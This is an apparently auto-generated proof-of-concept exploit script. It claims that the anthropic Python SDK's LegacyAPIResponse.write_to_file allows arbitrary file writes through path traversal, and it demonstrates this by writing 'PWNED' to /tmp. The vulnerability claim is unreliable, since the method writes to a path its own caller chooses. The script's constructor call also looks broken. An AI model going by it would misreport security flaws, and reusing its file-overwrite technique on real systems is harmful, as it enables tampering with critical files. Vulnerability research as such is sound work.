#!/usr/bin/env python3
# PoC for anthropic (/tmp/anthropic-sdk-python/src/anthropic)
# Path: lfi-025
# Sink: write_to_file
# Auto-generated — run with: python3 lfi_who_controls_write_to_file.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: Local File Write via path traversal in anthropic SDK's write_to_file

Vulnerability: The LegacyAPIResponse.write_to_file() method accepts a `file` argument
and passes it directly to open() without any validation, sanitization, or path restriction.
An attacker who can control this argument can write arbitrary data to any path the process
has write access to.

This PoC demonstrates the vulnerability by creating a mock API response and calling
write_to_file with an absolute path to /tmp/poc_success.txt. A real attacker could use
relative path traversal (e.g., ../../../../tmp/evil.py) or absolute paths to overwrite
critical files.

Usage: python3 poc_anthropic_lfi.py
Expected outcome: A file /tmp/poc_success.txt is created with the content "PWNED".
"""

import sys
import os

# Add the anthropic SDK source path (provided in the challenge environment)
SDK_PATH = "/tmp/anthropic-sdk-python/src"
if not os.path.isdir(SDK_PATH):
    print(f"[!] SDK path not found: {SDK_PATH}")
    print("[!] This PoC expects the anthropic SDK to be present at that location.")
    sys.exit(1)

sys.path.insert(0, SDK_PATH)

# ----------------------------------------------------------------------
# Step 1: Import the vulnerable class
# ----------------------------------------------------------------------
from anthropic._legacy_response import LegacyAPIResponse

# ----------------------------------------------------------------------
# Step 2: Create a mock response object that mimics the expected interface
#         The real object would be obtained from an API call; here we simulate
#         a minimal version with an iter_bytes generator.
# ----------------------------------------------------------------------
class MockResponse:
    """A fake HTTP response that yields benign bytes."""
    def iter_bytes(self):
        yield b"PWNED"
        yield b"\n"

mock_response = MockResponse()

# ----------------------------------------------------------------------
# Step 3: Instantiate LegacyAPIResponse with the mock response
# ----------------------------------------------------------------------
response_wrapper = LegacyAPIResponse(mock_response)

# ----------------------------------------------------------------------
# Step 4: Call write_to_file with an attacker-controlled path
#         (here we use an absolute path to /tmp to stay safe)
# ----------------------------------------------------------------------
target_file = "/tmp/poc_success.txt"
print(f"[*] Writing payload to {target_file} ...")
try:
    response_wrapper.write_to_file(target_file)
    print(f"[+] Success! File {target_file} created.")
except Exception as e:
    print(f"[-] Error during write: {e}")
    sys.exit(1)

# ----------------------------------------------------------------------
# Step 5: Verify the written content
# ----------------------------------------------------------------------
if os.path.isfile(target_file):
    with open(target_file, "r") as f:
        content = f.read()
    print(f"[+] Content read back: {repr(content)}")
    # Clean up (optional)
    # os.remove(target_file)
else:
    print("[!] File was not created.")
    sys.exit(1)

print("\n[*] PoC complete. The vulnerability is confirmed — write_to_file accepts any")
print("    path without validation. An attacker could write arbitrary files.")
